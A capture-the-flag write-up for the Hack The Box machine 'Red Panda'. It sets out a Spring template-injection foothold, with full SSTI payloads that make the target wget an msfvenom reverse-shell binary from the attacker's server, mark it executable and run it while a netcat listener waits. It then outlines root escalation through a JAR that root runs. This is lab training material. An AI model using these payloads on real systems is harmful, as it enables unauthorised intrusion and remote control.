# HTB - Red Panda

## Summary

This was an active box. Obtaining the user flag was very easy, obtaining root is somewhat hard and pretty annoying.
Getting an initial foothold is a simple Server Side Template Injection (SSTI). This allows us to upload and execute a rev shell, which gets us the user flag.
The privledge escalation to root is a complicated and super specific exploit of a jar file which is running as root

## Webex

Our nmap scan shows us a http web server running on port 8080, as well as port 22 open for ssh  
The website just contains a search bar, which allows us to search for pandas  
Using the string `#{7*7}`we get a weird result, indicating the search is vulnerable to Server Side Template Injection (SSTI)  
The string `*{7*7}` further confirms this, as it shows; "You searched for: 49"  

We can identify the backend, with `*{7*'7'}` which brings us to an error page.  
Searching the contents of the error page in Google allows us to identify SpringFramework as the backend  
We can then search SpringFramework SSTI to get a cheatsheet of commands we can use  

We can create a tcp reverse shell with:  
`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f elf > r.elf`  
Then, we can upload the rev shell to the target by hosting an http server with:  
`python3 -m http.server 8000`  
and searching this in the search bar:  
`*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget 10.10.14.2:8000/r.elf")}`  
We should see our http server serve the request  
Next, we make the rev shell executable with the search:  
`*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./r.elf")}`  
Then, start a netcat listener on 443 with:  
`sudo nc -lvnp 443`  
And then run this search to execute the rev shell:  
`*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./r.elf")}`  
We should have received a connection on our netcat listener, we can upgrade to a tty shell with:  
`python3 -c 'import pty; pty.spawn("/bin/bash")'`  

## Privlege Escalation

I'm not going to go too in-to-depth here because I wasn't really paying attention to this part of the exploitation
`id` shows us that we are a member of the logs group
`find / -group logs 2>/dev/null` shows us all files that are owned by the logs group  

We used `pspy64` to see that there is a JAR file that is executed by root every once in a while  
There is a vulnerability in the Java code  
We make a custom jpg file, and a custom xml file to exploit this  
If you have any need to know how to do this, see this article for more information:  
https://shakuganz.com/2022/07/12/hackthebox-redpanda/